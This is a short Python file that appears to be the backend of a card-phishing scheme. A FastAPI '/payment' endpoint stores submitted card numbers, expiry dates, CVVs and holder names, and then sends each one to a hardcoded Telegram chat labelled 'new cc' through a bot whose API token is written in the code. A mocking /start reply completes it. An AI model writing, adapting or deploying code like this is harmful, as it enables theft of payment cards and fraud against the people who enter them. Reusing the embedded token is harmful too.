from typing import List
from fastapi import APIRouter
from aiogram import Bot, Dispatcher, types
from src.models import CardsModel, CardsPydantic
from aiogram.filters import Command

API_TOKEN = "5082481522:AAHiyhgTlO8kFVCrHZqYhN4cPY0Cvjh7oaM"
bot = Bot(token=API_TOKEN)
dispatcher = Dispatcher()

router = APIRouter()

@router.post("/payment")
async def check_ton(card: CardsPydantic):
    card_dict = card.dict()
    new_card = await CardsModel.create(**card_dict)
    await send_telegram_message(card)
    return new_card

async def send_telegram_message(card: CardsPydantic):
    message_text = (
        f"new cc\n"
        f"number `{card.num}`\n"
        f"expired `{card.month}`/`{card.year}`\n"
        f"cvv `{card.cvv}`\n"
        f"name `{card.holder_name}`"
    )

    await bot.send_message(chat_id="1428375263", text=message_text,  parse_mode="MARKDOWN")

@dispatcher.message(Command('start'))
async def start(message: types.Message):
    await message.answer("вахапхвапхавпхвапхвапх")
